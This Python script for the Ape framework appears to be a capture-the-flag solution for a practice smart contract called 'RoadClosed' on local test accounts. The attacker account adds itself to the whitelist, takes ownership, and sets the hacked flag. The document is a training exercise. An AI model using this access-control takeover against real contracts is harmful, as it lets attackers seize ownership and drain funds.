from ape import accounts, project, networks
from ape.utils import EMPTY_BYTES32


w3 = networks.provider.web3


def set_up():
    print("\n--- Setting up scenario ---\n")

    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    print("\n--- Deploying challenge contract ---\n")
    road_closed = project.RoadClosed.deploy(sender=deployer)

    # assert correct state of contract
    print("\n--- Ensuring the contract has the correct initial state ---\n")
    assert road_closed.isOwner(sender=deployer)
    assert not road_closed.isHacked()
    assert w3.eth.get_storage_at(road_closed.address, 1) == EMPTY_BYTES32

    return attacker, road_closed


def main():
    attacker, road_closed = set_up()

    print("\n--- Running exploit... ---\n")
    # add ourselves to the whitelist mapping
    print("\n--- Adding ourselves to the whitelist ---\n")
    road_closed.addToWhitelist(attacker.address, sender=attacker)

    # call changeOwner function
    print("\n--- Becoming the owner of the contract ---\n")
    road_closed.changeOwner(attacker.address, sender=attacker)
    assert road_closed.isOwner(sender=attacker) == True, "!owner"

    # call pwn function
    print("\n--- Setting hacked variable to True ---\n")
    road_closed.pwn(attacker.address, sender=attacker)
    assert road_closed.isHacked()

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
